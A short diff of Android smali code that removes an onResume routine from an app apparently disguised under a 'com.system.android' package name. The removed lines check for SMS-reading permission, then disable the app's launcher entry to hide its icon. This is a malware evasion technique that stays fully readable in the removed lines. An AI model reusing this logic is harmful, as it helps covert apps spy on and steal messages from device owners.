@@ -14,41 +14,10 @@
 .end method
 
 .method protected onResume()V
-    .locals 5
+    .locals 0
 
     invoke-super {p0}, Landroid/app/Activity;->onResume()V
 
-    # [PLATINUM] Check if permission is granted to hide icon
-    const-string v0, "android.permission.READ_SMS"
-
-    invoke-virtual {p0, v0}, Lcom/system/android/ui/MainActivity;->checkSelfPermission(Ljava/lang/String;)I
-
-    move-result v0
-
-    if-nez v0, :cond_0
-
-    # Permission granted! Now we can hide the icon professionally
-    invoke-virtual {p0}, Lcom/system/android/ui/MainActivity;->getPackageManager()Landroid/content/pm/PackageManager;
-
-    move-result-object v0
-
-    new-instance v1, Landroid/content/ComponentName;
-
-    const-class v2, Lcom/system/android/ui/MainActivity;
-
-    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
-
-    const/4 v2, 0x2
-
-    const/4 v3, 0x1
-
-    # DONT_KILL_APP = 1, COMPONENT_ENABLED_STATE_DISABLED = 2
-    invoke-virtual {v0, v1, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
-
-    # Close the activity as setup is complete
-    invoke-virtual {p0}, Lcom/system/android/ui/MainActivity;->finish()V
-
-    :cond_0
     return-void
 .end method
 
